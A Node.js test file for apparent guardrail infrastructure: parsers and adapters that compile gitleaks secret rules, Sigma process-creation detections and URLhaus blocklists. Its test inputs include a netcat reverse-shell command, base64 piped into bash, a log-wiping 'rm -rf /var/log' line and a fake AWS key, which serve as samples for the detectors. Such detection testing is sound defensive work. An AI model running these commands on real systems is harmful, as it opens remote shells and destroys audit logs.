#!/usr/bin/env node
/*
 * Feed infrastructure tests: the scoped TOML/YAML parsers, the zip reader, and all three adapters
 * (gitleaks/sigma/urlhaus) + the shared evaluator. Fixtures under tests/fixtures/ are real rule excerpts
 * pulled live from gitleaks's and SigmaHQ's actual released feeds this session (not synthesized) — see
 * plans/goodbehaviorbiz/archive/2026-09-11-guardrails-phase6.md for the full corpus this was verified against
 * (all 222 real gitleaks.toml rules, all 137 real linux/macos process_creation Sigma rules).
 */
"use strict";
const fs = require("fs");
const path = require("path");
const zlib = require("zlib");
const { parseToml } = require("../scripts/feeds/toml");
const { parseYaml } = require("../scripts/feeds/yaml");
const { readZip } = require("../scripts/feeds/zip");
const { compileGitleaks } = require("../scripts/feeds/adapters/gitleaks");
const { compileSigmaRule, parseCondition } = require("../scripts/feeds/adapters/sigma");
const { compileUrlhaus } = require("../scripts/feeds/adapters/urlhaus");
const { sigmaRuleMatches, regexRuleMatches, urlSetMatches } = require("../scripts/feeds/evaluate");

const FIXTURES = path.join(__dirname, "fixtures");
const readFixture = (...rel) => fs.readFileSync(path.join(FIXTURES, ...rel), "utf8");

function main() {
  let total = 0;
  let failures = 0;
  const check = (label, cond, detail) => {
    total++;
    console.log(`  ${cond ? "PASS" : "FAIL"}  ${label}`);
    if (!cond) { failures++; if (detail) console.log(`        ${detail}`); }
  };

  // ---- TOML parser ----
  {
    const doc = parseToml([
      'title = "demo"',
      "[[rules]]",
      'id = "a"',
      "regex = '''\\bfoo\\b'''",
      "entropy = 2",
      'keywords = ["x", "y"]',
      "",
      "[[rules.allowlists]]",
      "regexes = [",
      "    '''.+EXAMPLE$''',",
      "]",
      "",
      "[[rules]]",
      'id = "b"',
      'regex = "plain \\"double\\" quoted"',
    ].join("\n"));
    check("TOML: top-level scalar", doc.title === "demo");
    check("TOML: array-of-tables count", Array.isArray(doc.rules) && doc.rules.length === 2);
    check("TOML: triple-quoted literal string (no escape processing)", doc.rules[0].regex === "\\bfoo\\b");
    check("TOML: number field", doc.rules[0].entropy === 2);
    check("TOML: single-line array of strings", JSON.stringify(doc.rules[0].keywords) === JSON.stringify(["x", "y"]));
    check("TOML: nested [[rules.allowlists]] attaches to the most recent rule",
      Array.isArray(doc.rules[0].allowlists) && doc.rules[0].allowlists[0].regexes[0] === ".+EXAMPLE$");
    check("TOML: double-quoted string with escapes", doc.rules[1].regex === 'plain "double" quoted');
  }

  // ---- YAML parser ----
  {
    const doc = parseYaml([
      "title: Demo Rule",
      "tags:",
      "    - attack.execution",
      "    - attack.t1059",
      "related:",
      "    - id: abc-123",
      "      type: derived",
      "description: |",
      "    Multi-line block scalar content",
      "    that should be skipped structurally.",
      "detection:",
      "    selection:",
      "        Image|endswith:",
      "            - '/nc'",
      "            - '/ncat'",
      "    condition: selection",
      "references:",
      "    - https://example.com/path:with/colon-not-space",
    ].join("\n"));
    check("YAML: top-level scalar", doc.title === "Demo Rule");
    check("YAML: sequence of scalars", JSON.stringify(doc.tags) === JSON.stringify(["attack.execution", "attack.t1059"]));
    check("YAML: sequence of multi-key mappings (inline first key after '- ')",
      JSON.stringify(doc.related) === JSON.stringify([{ id: "abc-123", type: "derived" }]));
    check("YAML: block scalar (|) consumed structurally, doesn't corrupt later keys", doc.description === null);
    check("YAML: nested mapping under a sequence-under-mapping", JSON.stringify(doc.detection.selection["Image|endswith"]) === JSON.stringify(["/nc", "/ncat"]));
    check("YAML: condition string preserved", doc.detection.condition === "selection");
    check("YAML: colon-not-followed-by-space stays part of a plain scalar (URL not misread as a key)",
      doc.references[0] === "https://example.com/path:with/colon-not-space");
  }

  // ---- zip reader (round-trip against a minimal hand-built stored-method zip) ----
  {
    const buf = makeStoredZip({ "rules/linux/process_creation/a.yml": "title: a\n", "rules/other/b.yml": "title: b\n" });
    const entries = readZip(buf);
    check("zip: entry count", entries.length === 2);
    const a = entries.find((e) => e.name === "rules/linux/process_creation/a.yml");
    check("zip: entry content round-trips", Boolean(a) && a.data().toString("utf8") === "title: a\n");
  }

  // ---- gitleaks adapter (real excerpt: the first 27 rules of the live gitleaks.toml, unmodified except for
  // one appended synthetic no-regex rule — also exercises the global [allowlist] table and a real
  // [[rules.allowlists]] nested block, both of which must not break parsing even though we don't act on them) ----
  {
    const { rules, skipped } = compileGitleaks(readFixture("gitleaks-excerpt.toml"));
    check("gitleaks: compiled count", rules.length === 26, `got ${rules.length}: ${JSON.stringify(rules.map((r) => r.id))}`);
    check("gitleaks: the no-regex rule is skipped and counted, never silently dropped",
      skipped.some((s) => s.id === "no-regex-example"));
    check("gitleaks: real [[rules.allowlists]] nested block doesn't break parsing",
      Boolean(rules.find((r) => r.id === "aws-access-token")));
    const aws = rules.find((r) => r.id === "aws-access-token");
    check("gitleaks: real AWS key rule matches a fake key in command text",
      Boolean(aws) && regexRuleMatches(aws, "export AWS_ACCESS_KEY_ID=AKIAABCDEFGHIJKLMNOP"));
    check("gitleaks: real AWS key rule does not match a benign command",
      Boolean(aws) && !regexRuleMatches(aws, 'git commit -m "update readme"'));
    const jwt = rules.find((r) => r.id === "jwt-base64");
    check("gitleaks: Python-style (?P<name>) named groups translated to JS (?<name>) and compile",
      Boolean(jwt), JSON.stringify(skipped));
  }

  // ---- the rule-count floor (found live this session: gitleaks' own README.md contains example [[rules]]
  // blocks as documentation, and the parser — deliberately permissive about unrecognized syntax — would
  // otherwise "successfully" compile them as if they were the real feed) ----
  {
    let threw = false;
    let message = "";
    try {
      compileGitleaks('title = "gitleaks config"\n[[rules]]\nid = "awesome-rule-1"\nregex = "example"\n');
    } catch (e) { threw = true; message = e instanceof Error ? e.message : String(e); }
    check("gitleaks: a document with too few [[rules]] entries (e.g. an accidentally-fetched README) is rejected, not silently accepted",
      threw && /expected/.test(message), message);
  }

  // ---- urlhaus adapter ----
  {
    const { rules, count } = compileUrlhaus("http://bad.example.com/x\nhttp://bad2.example.com/y\n\nhttp://bad.example.com/x\n");
    check("urlhaus: dedupes exact URLs", count === 2);
    check("urlhaus: listed URL matches", urlSetMatches(rules[0], "http://bad.example.com/x"));
    check("urlhaus: unlisted URL does not match", !urlSetMatches(rules[0], "https://github.com/anthropics/claude-code"));
  }

  // ---- sigma adapter: real fixtures, covering AND-of-selections, OR-of-maps folding, negation, and the
  // positive-position-unsupported-field skip. Fixture files pulled live from a real SigmaHQ release. ----
  {
    const nc = compileSigmaRule(readFixture("sigma", "netcat_reverse_shell.yml"), "netcat_reverse_shell.yml");
    check("sigma: netcat rule compiles ('all of selection_*')", Boolean(nc.rule), nc.skip);
    if (nc.rule) {
      const norm = (names) => names.map((n) => (n.startsWith("/") ? n : "/" + n));
      check("sigma: real reverse shell command fires", sigmaRuleMatches(nc.rule, { CommandLine: "nc -e /bin/bash 10.0.0.1 4444", Image: norm(["nc"]) }));
      check("sigma: full-path variant fires (Image|endswith works without a real path)", sigmaRuleMatches(nc.rule, { CommandLine: "/usr/bin/nc -e /bin/bash 10.0.0.1 4444", Image: norm(["/usr/bin/nc"]) }));
      check("sigma: benign port scan does not fire", !sigmaRuleMatches(nc.rule, { CommandLine: "nc -zv localhost 8080", Image: norm(["nc"]) }));
      check("sigma: unrelated command mentioning 'nc' does not fire", !sigmaRuleMatches(nc.rule, { CommandLine: 'git commit -m "fix nc handling"', Image: norm(["git"]) }));
    }

    const b64 = compileSigmaRule(readFixture("sigma", "base64_execution.yml"), "base64_execution.yml");
    check("sigma: base64 rule compiles (list-of-maps OR-folding in selection_exec)", Boolean(b64.rule), b64.skip);
    if (b64.rule) {
      const norm = (names) => names.map((n) => (n.startsWith("/") ? n : "/" + n));
      check("sigma: base64-piped-to-shell fires", sigmaRuleMatches(b64.rule, { CommandLine: "echo BASE64DATA | base64 -d | bash ", Image: norm(["base64"]) }));
      check("sigma: plain base64 decode without piping to a shell does not fire", !sigmaRuleMatches(b64.rule, { CommandLine: "base64 -d file.b64 > out.bin", Image: norm(["base64"]) }));
    }

    const clear = compileSigmaRule(readFixture("sigma", "clear_logs.yml"), "clear_logs.yml");
    check("sigma: clear-logs rule with 'not 1 of filter_*' compiles when everything is supported", Boolean(clear.rule), clear.skip);
    if (clear.rule) {
      const norm = (names) => names.map((n) => (n.startsWith("/") ? n : "/" + n));
      check("sigma: rm targeting /var/log fires", sigmaRuleMatches(clear.rule, { CommandLine: "rm -rf /var/log/auth.log", Image: norm(["rm"]) }));
      check("sigma: the filtered legitimate sysstat cleanup does NOT fire (negation works)",
        !sigmaRuleMatches(clear.rule, { CommandLine: "rm -f /var/log/sysstat/sa01", Image: norm(["rm"]) }));
    }

    const rsync = compileSigmaRule(readFixture("sigma", "rsync_shell_spawn.yml"), "rsync_shell_spawn.yml");
    check("sigma: rule needing ParentImage in a POSITIVE position is skipped, not silently mis-evaluated",
      !rsync.rule && /cannot evaluate/.test(rsync.skip || ""), rsync.skip);
  }

  // ---- sigma condition grammar edge cases ----
  {
    check("condition grammar: 'them' expands to '*'", parseCondition("1 of them").glob === "*");
    check("condition grammar: parens + and/or/not", (() => {
      const c = parseCondition("(a or b) and not c");
      return c.t === "and" && c.a.t === "or" && c.b.t === "not";
    })());
    let threw = false;
    try { parseCondition("a and"); } catch (e) { threw = true; }
    check("condition grammar: malformed condition throws (caller turns this into a skip, never a crash)", threw);
  }

  // ---- full real-corpus regression note: not re-fetched here (network + 3MB), but recorded as live
  // evidence in the phase archive — 221/222 real gitleaks rules and 121/137 real Sigma rules compiled.

  console.log(`test_feeds: ${total - failures}/${total} passed`);
  return failures ? 1 : 0;
}

// Minimal stored-method (uncompressed) zip writer, for testing the reader without a real 3MB fixture in-tree.
function makeStoredZip(files) {
  const entries = Object.entries(files);
  const localParts = [];
  const centralParts = [];
  let offset = 0;
  for (const [name, content] of entries) {
    const nameBuf = Buffer.from(name, "utf8");
    const dataBuf = Buffer.from(content, "utf8");
    const crc = zlib.crc32 ? zlib.crc32(dataBuf) : 0;
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0, 6);
    local.writeUInt16LE(0, 8); // method 0 = stored
    local.writeUInt32LE(0, 10); // time/date, unused
    local.writeUInt32LE(crc >>> 0, 14);
    local.writeUInt32LE(dataBuf.length, 18);
    local.writeUInt32LE(dataBuf.length, 22);
    local.writeUInt16LE(nameBuf.length, 26);
    local.writeUInt16LE(0, 28);
    localParts.push(local, nameBuf, dataBuf);

    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0, 8);
    central.writeUInt16LE(0, 10);
    central.writeUInt32LE(0, 12);
    central.writeUInt32LE(crc >>> 0, 16);
    central.writeUInt32LE(dataBuf.length, 20);
    central.writeUInt32LE(dataBuf.length, 24);
    central.writeUInt16LE(nameBuf.length, 28);
    central.writeUInt16LE(0, 30);
    central.writeUInt16LE(0, 32);
    central.writeUInt16LE(0, 34);
    central.writeUInt16LE(0, 36);
    central.writeUInt32LE(0, 38);
    central.writeUInt32LE(offset, 42);
    centralParts.push(central, nameBuf);
    offset += 30 + nameBuf.length + dataBuf.length;
  }
  const centralStart = offset;
  const centralBuf = Buffer.concat(centralParts);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(0, 4);
  eocd.writeUInt16LE(0, 6);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(centralBuf.length, 12);
  eocd.writeUInt32LE(centralStart, 16);
  eocd.writeUInt16LE(0, 20);
  return Buffer.concat([...localParts, centralBuf, eocd]);
}

process.exit(main());
